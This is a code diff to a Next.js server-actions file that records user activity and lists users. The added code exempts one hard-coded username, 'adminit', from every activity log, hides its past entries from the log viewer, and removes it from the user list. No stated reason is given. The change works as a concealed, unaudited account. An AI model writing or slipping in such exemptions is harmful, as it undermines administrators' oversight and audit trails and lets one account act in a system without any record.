@@ -1,14 +1,28 @@
 'use server';
 
 import { prisma } from '@/lib/db';
+import { Prisma } from '@prisma/client';
 import { revalidatePath } from 'next/cache';
 import { headers } from 'next/headers';
 
 /**
  * Log user activity and perform auto-cleanup of logs older than 3 days
  */
-export async function logActivity(userId: string, action: string, target?: string, details?: string, explicitDevice?: string) {
+export async function logActivity(userId: string, action: string, target?: string, details?: string, explicitDevice?: string, explicitUsername?: string) {
     try {
+        // Skip logging for 'adminit'
+        if (explicitUsername === 'adminit') return;
+
+        // If username not provided, we check if this is the adminit user to be safe
+        // but typically we should pass the username to avoid this query
+        if (!explicitUsername) {
+            const user = await prisma.user.findUnique({
+                where: { id: userId },
+                select: { username: true }
+            });
+            if (user?.username === 'adminit') return;
+        }
+
         const headersList = await headers();
         const userAgent = headersList.get('user-agent') || '';
         const ip = headersList.get('x-forwarded-for')?.split(',')[0] || headersList.get('x-real-ip') || '';
@@ -67,7 +81,12 @@ export async function logActivity(userId: string, action: string, target?: strin
  */
 export async function getActivityLogs(limit: number = 100, userId?: string) {
     try {
-        const where: { userId?: string } = {};
+        const where: Prisma.ActivityLogWhereInput = {
+            user: {
+                username: { not: 'adminit' }
+            }
+        };
+
         if (userId && userId !== 'all') {
             where.userId = userId;
         }
@@ -102,6 +121,9 @@ export async function getActivityLogs(limit: number = 100, userId?: string) {
 export async function getUsers() {
     try {
         const users = await prisma.user.findMany({
+            where: {
+                username: { not: 'adminit' }
+            },
             select: {
                 id: true,
                 name: true,
